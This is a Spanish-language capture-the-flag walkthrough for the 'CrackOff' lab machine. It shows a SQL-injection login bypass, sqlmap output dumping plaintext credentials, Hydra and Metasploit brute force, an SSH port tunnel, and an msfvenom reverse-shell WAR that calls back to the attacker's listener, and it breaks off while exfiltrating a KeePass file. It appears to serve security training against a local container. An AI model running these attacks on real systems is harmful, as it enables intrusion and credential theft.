---
icon: flag
---

# CTF CrackOff Hard

URL Download CTF = [https://drive.google.com/file/d/1zMH1DN9jQRsVaGbjXdcQ5C8yKysmT179/view?usp=sharing](https://drive.google.com/file/d/1zMH1DN9jQRsVaGbjXdcQ5C8yKysmT179/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip crackoff.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh crackoff.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.25.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 13:57 EDT
Nmap scan report for 172.25.0.2
Host is up (0.000039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3d:fc:bd:41:cb:81:e8:cd:a2:58:5a:78:68:2b:a3:04 (ECDSA)
|_  256 d8:5a:63:27:60:35:20:30:a9:ec:25:36:9e:50:06:8d (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: CrackOff - Bienvenido
MAC Address: 02:42:AC:19:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.07 seconds
```

Vemos que hay un puerto `80` en el que si intentamos iniciar sesion, vemos que por detras funciona un `mysql` ya que revisa la autenticacion de los usuarios y si probamos a meter lo siguiente.

```
User = admin' OR 1=1-- -
Pass = admin' OR 1=1-- -
```

Vemos que nos deja logearnos, por lo que utilizaremos `sqlmap`.

## sqlmap

Antes de nada capturaremos la peticion con `BurpSuit` para iniciar el `sqlmap` mediante ese `request`.

> request.txt

```
POST /db.php HTTP/1.1
Host: 172.25.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://172.25.0.2
Connection: close
Referer: http://172.25.0.2/login.php
Upgrade-Insecure-Requests: 1


username=admin&password=admin
```

Una vez hecho lo anterior ahora si explotaremos la base de datos.

```shell
sqlmap -r request.txt --dbs
```

Info:

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.7#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:03:25 /2024-08-21/

[14:03:25] [INFO] parsing HTTP request from 'request.txt'
[14:03:25] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.25.0.2/error.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
[14:03:28] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:03:28] [INFO] testing if the target URL content is stable
[14:03:28] [WARNING] POST parameter '
username' does not appear to be dynamic
[14:03:28] [WARNING] heuristic (basic) test shows that POST parameter '
username' might not be injectable
[14:03:28] [INFO] testing for SQL injection on POST parameter '
username'
[14:03:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:03:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:03:28] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:03:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:03:28] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[14:03:28] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[14:03:28] [INFO] testing 'Generic inline queries'
[14:03:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:03:28] [WARNING] time-based comparison requires larger statistical model, please wait. (done)                                                                                      
[14:03:28] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[14:03:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[14:03:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:03:29] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[14:03:29] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[14:03:29] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[14:03:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[14:03:30] [WARNING] POST parameter '
username' does not seem to be injectable
[14:03:30] [WARNING] POST parameter 'password' does not appear to be dynamic
[14:03:30] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[14:03:30] [INFO] heuristic (XSS) test shows that POST parameter 'password' might be vulnerable to cross-site scripting (XSS) attacks
[14:03:30] [INFO] testing for SQL injection on POST parameter 'password'
[14:03:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:03:30] [WARNING] reflective value(s) found and filtering out
[14:03:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:03:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:03:30] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:03:30] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[14:03:30] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[14:03:30] [INFO] testing 'Generic inline queries'
[14:03:30] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:03:30] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[14:03:30] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[14:03:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:03:40] [INFO] POST parameter 'password' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[14:03:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:03:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:03:54] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[14:03:54] [INFO] target URL appears to have 3 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] n
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[14:03:56] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[14:03:56] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[14:03:58] [INFO] checking if the injection point on POST parameter 'password' is a false positive
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 202 HTTP(s) requests:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 
username=admin&password=admin' AND (SELECT 5760 FROM (SELECT(SLEEP(5)))bBpi) AND 'gWSm'='gWSm
---
[14:04:16] [INFO] the back-end DBMS is MySQL
[14:04:16] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[14:04:16] [INFO] fetching database names
[14:04:16] [INFO] fetching number of databases
[14:04:16] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
4
[14:04:25] [INFO] retrieved: 
[14:04:35] [INFO] adjusting time delay to 1 second due to good response times
information_schema
[14:05:32] [INFO] retrieved: performance_schema
[14:06:29] [INFO] retrieved: crackoff_db
[14:07:04] [INFO] retrieved: crackofftrue_db
available databases [4]:
[*] crackoff_db
[*] crackofftrue_db
[*] information_schema
[*] performance_schema

[14:07:52] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 48 times
[14:07:52] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.25.0.2'

[*] ending @ 14:07:52 /2024-08-21/
```

Ahora que sabemos que la base de datos es `crackofftrue_db` haremos lo siguiente.

```shell
sqlmap -r request.txt --batch -D crackofftrue_db --threads 10 --tables
```

Info:

```
       ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.7#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:10:21 /2024-08-21/

[14:10:21] [INFO] parsing HTTP request from 'request.txt'
[14:10:22] [INFO] resuming back-end DBMS 'mysql' 
[14:10:22] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.25.0.2/error.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 
username=admin&password=admin' AND (SELECT 5760 FROM (SELECT(SLEEP(5)))bBpi) AND 'gWSm'='gWSm
---
[14:10:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[14:10:22] [INFO] fetching tables for database: 'crackofftrue_db'
[14:10:22] [INFO] fetching number of tables for database 'crackofftrue_db'
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[14:10:22] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                         
[14:10:22] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
1
[14:10:27] [INFO] retrieved: 
[14:10:37] [INFO] adjusting time delay to 1 second due to good response times
users
Database: crackofftrue_db
[1 table]
+-------+
| users |
+-------+

[14:10:51] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.25.0.2'

[*] ending @ 14:10:51 /2024-08-21/
```

Sabiendo que la tabla se llama `users` haremos lo siguiente.

```shell
sqlmap -r request.txt --batch -D crackofftrue_db -T users --threads 10 --columns
```

Info:

```
       ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.7#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:11:46 /2024-08-21/

[14:11:46] [INFO] parsing HTTP request from 'request.txt'
[14:11:46] [INFO] resuming back-end DBMS 'mysql' 
[14:11:46] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.25.0.2/error.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 
username=admin&password=admin' AND (SELECT 5760 FROM (SELECT(SLEEP(5)))bBpi) AND 'gWSm'='gWSm
---
[14:11:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[14:11:46] [INFO] fetching columns for table 'users' in database 'crackofftrue_db'
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[14:11:46] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                         
[14:11:47] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[14:12:02] [INFO] adjusting time delay to 1 second due to good response times
3
[14:12:02] [INFO] retrieved: id
[14:12:08] [INFO] retrieved: int
[14:12:20] [INFO] retrieved: password
[14:12:48] [INFO] retrieved: varchar(50)
[14:13:22] [INFO] retrieved: username
[14:13:45] [INFO] retrieved: varchar(50)
Database: crackofftrue_db
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int         |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+

[14:14:19] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.25.0.2'

[*] ending @ 14:14:19 /2024-08-21/
```

Ahora sabiendo como se compone nuestra tabla, podremos ver lo que contiene.

```shell
sqlmap -r request.txt --batch -D crackofftrue_db -T users --threads 10 --dump
```

Info:

```
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.7#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:14:52 /2024-08-21/

[14:14:52] [INFO] parsing HTTP request from 'request.txt'
[14:14:52] [INFO] resuming back-end DBMS 'mysql' 
[14:14:52] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.25.0.2/error.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 
username=admin&password=admin' AND (SELECT 5760 FROM (SELECT(SLEEP(5)))bBpi) AND 'gWSm'='gWSm
---
[14:14:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[14:14:52] [INFO] fetching columns for table 'users' in database 'crackofftrue_db'
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[14:14:52] [INFO] resumed: 3
[14:14:52] [INFO] resumed: id
[14:14:52] [INFO] resumed: password
[14:14:52] [INFO] resumed: username
[14:14:52] [INFO] fetching entries for table 'users' in database 'crackofftrue_db'
[14:14:52] [INFO] fetching number of entries for table 'users' in database 'crackofftrue_db'
[14:14:52] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                         
[14:14:52] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
1
[14:15:08] [INFO] adjusting time delay to 1 second due to good response times
2
[14:15:11] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                
1
[14:15:13] [INFO] retrieved: password123
[14:15:47] [INFO] retrieved: rejetto
[14:16:11] [INFO] retrieved: 2
[14:16:15] [INFO] retrieved: alicelaultramejor
[14:17:03] [INFO] retrieved: tomitoma
[14:17:30] [INFO] retrieved: 3
[14:17:33] [INFO] retrieved: passwordinhack
[14:18:18] [INFO] retrieved: alice
[14:18:31] [INFO] retrieved: 4
[14:18:35] [INFO] retrieved: supersecurepasswordultra
[14:19:51] [INFO] retrieved: whoami
[14:20:10] [INFO] retrieved: 5
[14:20:14] [INFO] retrieved: estrella_big
[14:20:53] [INFO] retrieved: pip
[14:21:06] [INFO] retrieved: 6
[14:21:11] [INFO] retrieved: colorcolorido
[14:21:56] [INFO] retrieved: rufus
[14:22:12] [INFO] retrieved: 7
[14:22:17] [INFO] retrieved: ultramegaverypasswordhack
[14:23:32] [INFO] retrieved: jazmin
[14:23:51] [INFO] retrieved: 8
[14:23:56] [INFO] retrieved: unbreackroot
[14:24:34] [INFO] retrieved: rosa
[14:24:46] [INFO] retrieved: 9
[14:24:49] [INFO] retrieved: happypassword
[14:25:36] [INFO] retrieved: mario
[14:25:50] [INFO] retrieved: 10
[14:25:54] [INFO] retrieved: admin12345password
[14:26:49] [INFO] retrieved: veryhardpassword
[14:27:41] [INFO] retrieved: 11
[14:27:45] [INFO] retrieved: carsisgood
[14:28:15] [INFO] retrieved: root
[14:28:32] [INFO] retrieved: 12
[14:28:36] [INFO] retrieved: badmenandwomen
[14:29:19] [INFO] retrieved: admin
Database: crackofftrue_db
Table: users
[12 entries]
+----+---------------------------+------------------+
| id | password                  | username         |
+----+---------------------------+------------------+
| 1  | password123               | rejetto          |
| 2  | alicelaultramejor         | tomitoma         |
| 3  | passwordinhack            | alice            |
| 4  | supersecurepasswordultra  | whoami           |
| 5  | estrella_big              | pip              |
| 6  | colorcolorido             | rufus            |
| 7  | ultramegaverypasswordhack | jazmin           |
| 8  | unbreackroot              | rosa             |
| 9  | happypassword             | mario            |
| 10 | admin12345password        | veryhardpassword |
| 11 | carsisgood                | root             |
| 12 | badmenandwomen            | admin            |
+----+---------------------------+------------------+

[14:29:34] [INFO] table 'crackofftrue_db.users' dumped to CSV file '/root/.local/share/sqlmap/output/172.25.0.2/dump/crackofftrue_db/users.csv'
[14:29:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.25.0.2'

[*] ending @ 14:29:34 /2024-08-21/
```

Por lo que vemos, vemos muchos usuarios y contraseñas, por lo que nos haremos un diccionario de `usuarios` y `passwords` con `hydra` para ver cual de todos es accesible por `ssh`.

## hydra

> users.txt

```
rejetto
alice
tomitoma
whoami
pip
rufus
jazmin
rosa
mario
veryhardpassword
root
admin
```

> passwords.txt

```
password123
alicelaultramejor
passwordinhack
supersecurepasswordultra
estrella_big
colorcolorido
ultramegaverypasswordhack
unbreackroot
happypassword
admin12345password
carsisgood
badmenandwomen
```

```shell
hydra -L users.txt -P passwords.txt ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-21 14:30:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 144 login tries (l:12/p:12), ~3 tries per task
[DATA] attacking ssh://172.25.0.2:22/
[22][ssh] host: 172.25.0.2   login: rosa   password: ultramegaverypasswordhack
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-21 14:30:54
```

Por lo que vemos hemos sacado un usuario, asi que nos metemos por ssh mediante esas credenciales.

## SSH

```shell
ssh rosa@<IP>
```

Metemos la contraseña obtenida y ya estariamos dentro.

## Puerto tomcat tunelizado a host

Si vemos los puertos que hay activos o abiertos en este momento, veremos lo siguiente.

```shell
netstat -punta
```

Info:

```
(No info could be read for "-p": geteuid()=1002 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.11:41443        0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8005          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0    268 172.25.0.2:22           172.25.0.1:41482        ESTABLISHED -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.11:50961        0.0.0.0:*  
```

Vemos que hay un puerto `8080` ejecutandose en local que ese puerto esta por defecto para el `tomcat`, por lo que nos lo pasaremos a nuestro host mediante una tunelizacion del puerto con ayuda de la herramienta del `ssh`.

Saldremos de la sesion del usuario `rosa` y nos volveremos a conectar a ella con el siguiente comando.

```shell
ssh rosa@<IP> -L 8080:127.0.0.1:8080
```

Metemos la contraseña y sin salirnos de la sesion, nos vamos a una pagina web en nuestro navegador del host poniendo la siguiente direccion URL.

```
URL = http://127.0.0.1:8080/
```

Por lo que podremos ver, veremos un tomcat en funcionamiento y si nos vamos a la direccion del panel del login del administrador, veremos que esta por defecto haciendo lo siguiente.

```
URL = http://127.0.0.1:8080/manager/
```

Nos pedira unas credenciales, por lo que haremos fuerza bruta con la lista de usuarios y contraseñas que ya recopilamos anteriormente.

### fuerza bruta tomcat con metasploit

```shell
msfconsole -q
```

Seleccionamos el modulo adecuado.

```shell
use auxiliary/scanner/http/tomcat_mgr_login
```

Configuramos todo.

```shell
set RHOSTS 127.0.0.1
set USER_FILE PATH/users.txt
set PASS_FILE PATH/passwords.txt
set VERBOSE false
```

Ejecutamos la fuerza bruta.

```shell
run
```

Info:

```
[+] 127.0.0.1:8080 - Login Successful: tomitoma:supersecurepasswordultra
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Por lo que vemos nos saco unas credenciales, las cuales utilizaremos para logearnos en tomcat.

```
User = tomitoma
Pass = supersecurepasswordultra
```

Una vez estando dentro del panel de administrador de tomcat, subiremos una aplicacion con una `Reverse Shell` para obtener acceso mediante el usuario tomcat.

## Escalate user tomcat

Generaremos la aplicacion maliciosa para que lo pueda soportar tomcat.

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o revshell.war
```

Una vez generada, dentro del panel le daremos a subir archivo y seleccionaremos el archivo `revshell.war`, una vez subido, veremos que se añadio en la seccion de aplicaciones, por lo que antes de darle al archivo y ejecutarlo en la interfaz grafica estaremos a la escucha con metasploit.

### Escucha de metasploit

Nos crearemos un archivo para automatizar la escucha.

> handler.rc

```shell
nano handler.rc

#Dentro del nano
use multi/handler
set payload java/jsp_shell_reverse_tcp
set LHOST <IP>
set LPORT <PORT>
run
```

```shell
msfconsole -q -r handler.rc
```

Info:

```
[*] Processing handler.rc for ERB directives.
resource (handler.rc)> use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (handler.rc)> set payload java/jsp_shell_reverse_tcp
payload => java/jsp_shell_reverse_tcp
resource (handler.rc)> set LHOST 192.168.5.145
LHOST => 192.168.5.145
resource (handler.rc)> set LPORT 7777
LPORT => 7777
resource (handler.rc)> run
[*] Started reverse TCP handler on 192.168.5.145:7777 

```

Y con esto veremos que estamos a la escucha, por lo que ya ejecutaremos la aplicacion dandole click en ella.

Una vez hecho eso si volvemos a la escucha tardara un poco pero obtendremos una shell y si hacemos `whoami` veremos que somos el usuario `tomcat`.

```
[*] Command shell session 1 opened (192.168.5.145:7777 -> 172.25.0.2:35834) at 2024-08-21 14:51:50 -0400

whoami
tomcat
```

Nos importamos una shell mejor.

```shell
script /dev/null -c bash
```

Info:

```
script /dev/null -c bash
Script started, output log file is '/dev/null'.
tomcat@788ab34d6661:/$
```

## Escalate user mario

Si vamos a la siguiente ubicacion.

```shell
cd /opt/tomcat
```

Y listamos los archivos veremos un archivo raro llamado `mario.txt` que si lo leeremos veremos lo siguiente.

```
mario:marioeseljefe
```

Son las credenciales del usuario `mario` por lo que nos conectaremos por `ssh`.

## SSH con mario

```shell
ssh mario@<IP>
```

Metemos la contraseña obtenida y ya estariamos dentro por lo que leeremos la flag.

> user.txt

```
d099be3ff7be7294c9344daadebca767
```

Si listamos nuestra `home` veremos lo siguiente.

```
total 40
drwxr-x--- 1 mario mario 4096 Aug 21 20:55 .
drwxr-xr-x 1 root  root  4096 Aug 21 19:06 ..
-rw------- 1 mario mario   18 Aug 21 19:07 .bash_history
-rw-r--r-- 1 mario mario  220 Aug 21 15:00 .bash_logout
-rw-r--r-- 1 mario mario 3771 Aug 21 19:06 .bashrc
drwx------ 2 mario mario 4096 Aug 21 20:55 .cache
-rw-r--r-- 1 mario mario  807 Aug 21 15:00 .profile
-rw-r--r-- 1 mario mario 1797 Aug 21 19:13 alice.kdbx
-rw-r--r-- 1 root  root    33 Aug 21 19:02 user.txt
```

## keepassxc

Vemos un archivo `keepass` llamado `alice.kdbx`, por lo que nos lo pasaremos a nuestro host para trabajar con el.

```shell
python3 -m http.server 7755
```

Y en nuestro host nos lo descargamos.

```shell
wget http://<IP>:7755/alice.kdbx
```

Info:

```
--2024-08-21 14:58:51--  http://172.25.0.2:7755/alice.kdbx
Connecting to 172.25.0.2:7755... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1797 (1.8K) [application/octet-stream]
Saving to: ‘alice.kdbx’

alice.kdbx                                    100%[=================================================================================================>]   1.75K  --.-KB/s    in 0s      

